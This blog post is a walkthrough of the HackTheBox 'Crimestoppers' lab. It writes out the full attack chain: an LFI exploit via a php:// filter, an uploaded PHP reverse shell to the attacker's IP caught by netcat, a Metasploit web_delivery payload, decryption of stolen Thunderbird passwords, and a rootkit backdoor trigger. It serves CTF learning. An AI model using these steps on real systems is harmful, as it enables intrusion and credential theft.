<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Crimestoppers Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-crimestoppers-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-06-08T15:33:58+00:00">June 8, 2018</time><time class="updated" datetime="2025-07-05T17:49:09+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are sharing our experience that can be helpful in solving new CTF challenge: Crimestoppers of Hack The Box. Solving this lab is not much easy, all you need is your penetration skill to solve this challenge.</span></p>
<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Find the user.txt and root.txt in the vulnerable Lab.</span></p>
<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning</span></li>
<li><span style="color: #000000;">Enumeration</span></li>
<li><span style="color: #000000;">Exploiting Web Applications</span></li>
<li><span style="color: #000000;">Capture user.txt</span></li>
<li><span style="color: #000000;">Privilege Escalation</span></li>
<li><span style="color: #000000;">Capture root.txt Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<h3><span style="color: #800000;">Network Scanning </span></h3>
<p><span style="color: #000000;">These labs are only available online, therefore, they have a static IP. Crimestoppers has IP: 10.10.10.80.</span></p>
<p><span style="color: #000000;">As we knew the initial stage is enumeration; therefore use nmap Aggressive scan for gathering target’s machine and running services information.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4NqinYEDDvg/WxqewiKCl_I/AAAAAAAAXPg/UfFIiOyyY54QVQs4Tx5ur2GWwJdJhinnwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Knowing port 80 was open on victim’s network we preferred to explore his IP in the browser and the following image opened as shown below.  Here, we can see that it has two pages: <strong>home and upload </strong>but didn’t find anything suspicious.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oIFPlI0Qnfc/Wxqezu4fc_I/AAAAAAAAXQU/lqlW512XDf8MCoFRF1npN2uasE1m_E2hQCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">So next, we use the dirb tool of kali to enumerate the directories and found some important directories such as http://10.10.10.80/?op=view and went on the web browser to explore them.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dJ2lJwUApNk/Wxqe0sQwMBI/AAAAAAAAXQk/6lDtNzABhkE5zaDuOqxsUsTN440aTQwzQCLcBGAs/s1600/3.1.png"/></span></p>
<p><span style="color: #000000;">At upload, you can upload any comment as a Tip, in order to provide some information. So we try to upload malicious code here but get failed each time.</span></p>
<p><span style="color: #000000;">If you will observe the URL http:// 10.10.10.80/?op=upload then you will realize that its look like that LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l65kIN1U0ew/Wxqe07yAU9I/AAAAAAAAXQo/HsgEC4Wxu5kTke6W9XqPuDZK4PkYNKNkwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">But it was not easy that much to exact information by exploiting LFI with help of ../etc/password therefore by making little bit more effort and taking help from my previous <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/">article</a></span>. We used curl command to find out the data from inside it with the help of PHP base64-encode.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://10.10.10.80/?op=upload =php://filter/convert.base64-encode/resource=upload</pre>
<p><span style="color: #000000;">As result, it returns base64 encode text which we need to decode.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-gNmMMjJn9hA/Wxqe1KL_NcI/AAAAAAAAXQs/tazJj61cslktf226EOoQjphgV8vvA5THACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">To decode base64 encoded text follow below syntax and found a PHP script that was pointing toward some kind of token and secretname which was a link to uploads directory.</span></p>
<p><span style="color: #000000;"><strong>Syntax</strong>: echo BASE64TEXT | base64 -d</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Tq7QVkgtL9A/Wxqe1kykFpI/AAAAAAAAXQw/7u8lG5XXsVA867pFrxFMWib-HELDKeLSACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">After struggling a lot, finally, we successfully uploaded our PHP backdoor with help burp suite. Follow the given step to upload PHP web shell.</span></p>
<p><span style="color: #000000;">Open php-reverse-shell.php which is inbuilt in Kali Linux from path: /user/share/webshells/php and modify <strong>ATTACKER’s IP</strong> and save this file on the desktop. Here we have renamed it as <strong>shell.php</strong> and compress this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zip -0 shell.zip shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S7BhOiLXLHk/Wxqe1hF6MrI/AAAAAAAAXQ0/iHY0h4nrLFgvArpNTlSgxiRFVumPpXLSACLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Web Application</span></h3>
<p><span style="color: #000000;">In order to capture the request web browser, enter the information for Tips and name then turn burp suite and click on Send Tip.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OJSLpEGfwUc/Wxqe1nArz9I/AAAAAAAAXQ4/3hQS63Qp0gk_LuG6cJUJLHyAfq1_3WybwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now in order to upload the content of our php backdoor through burp select the string “shell” for name = tip as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-D3yy21BghwM/Wxqew5SNizI/AAAAAAAAXPk/84T7Er6kzUYMyYmbwPSdiIKteYpbFJwmACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">And choose php file to paste it content at the place of shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0QbTGs7AMMU/Wxqew453gpI/AAAAAAAAXPo/Iz4b_KGycK0SJcv3SDufwwgMeW9aNWb2wCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">As you can observe that we have successfully uploaded our malicious PHP content here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-suaM1BJgmew/WxqexaGkyoI/AAAAAAAAXPs/YvvkPT6IY786Lvp1FpxtwxwAI1dvkXQGwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now forward the intercepted request and you will get secretname for the uploaded file as highlighted, copy it. Then forward the request again, it will give the success.txt message and at last forward the request one more time.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4iUkQscW_B8/WxqexkH1erI/AAAAAAAAXPw/i9r9pNXyvyMzxXC_BNvXTcoOmhoEjBH7ACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Do not forget to launch netcat for reverse connection before executing your uploaded file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;">Now open the browser and execute the following command that contains secretname of the uploaded file (PHP backdoor) and you will get netcat session for reverse connection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.80/?op=zip://uploads/10.10.14.25/e0d7a2f54d16633eb0eddfb10efed8ea5a200274%23shell
python -c 'import pty; pty.spawn("/bin/sh")'</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-61Quhxb4Lpo/WxqexoTaXeI/AAAAAAAAXP0/eysTvpEHAFMDG_2rNn4KKBqtGdUhsfiDQCLcBGAs/s1600/14.png"/></strong></span></p>
<p><span style="color: #000000;">Because we love to work with meterpreter session therefore with help of Metasploit web_delivary module we generate malicious python code as shown.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.25
msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.25
msf exploit(multi/script/web_delivery) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-z3RSVChXN4E/Wxqex-Pa-CI/AAAAAAAAXP4/2M4cUSovsos7aA5HvciWP_chWtnObtxBgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Paste copied code in netcat which will provide meterpreter session inside Metasploit framework.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AeZFOBhi80o/WxqeyMMjpZI/AAAAAAAAXP8/I1tsGdJinyY0GphrgWLRVu1Zw8Gze2pnACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">HURRAYYYY!!! We got our meterpreter session, now let’s grab the user.txt file first.</span></p>
<p><span style="color: #000000;">Inside path: /<strong>home/dom</strong> I found <strong>user.txt</strong> file and used cat “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd home
ls
cd dom
ls
cat user.txt</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We got our 1<sup>st</sup> flag successfully</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-RwXTI0oINRA/Wxqeyb3ZXiI/AAAAAAAAXQA/rGYourbK3l4GumRHVx8DNQcsVQgYzrpogCLcBGAs/s1600/17.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Now we need to find the root.txt file to finish this challenge and believe me it was not easy until you want the hint which is hidden by the author. We try every possible method to escalated privilege to gain the root access but it was quite different from previous experience.</span></p>
<p><span style="color: #000000;">After penetrating more and more we found a “36jinndk.default” from inside <em>/home/dom/.thunderbird</em>, which was encrypted file for Thunderbird profile, therefore, we download it in our local system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt; download 36jinndk.default /root/Desktop/36</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MV9nxiOsLXI/Wxqeyvq1UII/AAAAAAAAXQE/nHX74pn9PlotpEAgq86uLlFj4iCpZipvQCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Since it was encrypted file of Thunderbird profile so with help of Google we found a python script from this Link: <strong>https://github.com/unode/firefox_decrypt</strong> for its decryption.</span></p>
<p><span style="color: #000000;">With help of the following command, we successfully found password: Gummer59</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python firefox_decrypt.py /root/Desktop/36</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TC1TT_pTIJw/Wxqey2eO3TI/AAAAAAAAXQI/c9cH7_mtxK04qPJygjoFsqO6pmGRKHM2wCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">We applied this password to the escalated user: dom with help of the following command and then move into crimestoppers.htb directory it looks like his mailbox directory where we found so many files such INBOX.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su dome
Password:
cd /home/dom/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-A74fEcb3EHs/WxqezQBjhsI/AAAAAAAAXQM/g1LFWvp5ai4PN7OjtKvkq4foC5mKfFFRACLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Firstly, we look into INBOX for any hint for root.txt. Since we didn’t find something related to root.txt flag similarly we open other files but didn’t find anything.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-THtpoWuu-74/WxqezkVqESI/AAAAAAAAXQQ/PIuIGv_rbC0Xd4lstn-N8MNdBpRdx8QWQCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">At last, we open Drafts-1 and read the following line which looks like a hint of root access.</span></p>
<p><span style="color: #000000;">“I don’t trust them and run rkhunter, it reported that there a rootkit installed called:apache_modrootme backdoor” and its execution method.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XqPQSugdlNM/Wxqe0BitFHI/AAAAAAAAXQY/8ZFQl5kKOJ8KxAusQEG0AYe60nnyUxt6gCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">So we explore following the path and we found<strong> access.log.2.gz</strong> file since it was a compressed file, therefore, it was better to copy it inside /tmp for further steps.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/log/apache2
cp access.log.2.gz/tmp</pre>
<p><span style="color: #000000;">Now let’s move inside /tmp to extract the copied file inside it with the help of gunzip.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gunzip access.log.2.gz
ls
cat access.log.2.gz</pre>
<p><span style="color: #000000;">You can observe the log for a command “FunSociety” which has been executed several times.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YqIfzxrNCWw/Wxqe0btIeeI/AAAAAAAAXQc/iOHIs7pyEfccae3uKY73_SMV2c3s4Bt4QCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">As per the message read from DRAFT-1. We run netcat on localhost on port 80 get root access with help of following commands when executed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc localhost 80
get FunSociety
get FunSociety
id</pre>
<p><span style="color: #000000;">Now let’s get the root.txt and finish this task.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
cat root.txt</pre>
<h5><span style="color: #000000;">BOOOOOM!!!! We hit the Goal and completed both task.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bvKe2T4zRDs/Wxqe0dT04uI/AAAAAAAAXQg/Dt1MlGGgMs8zQXpr6fNkhXjD5EIzjdjmgCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
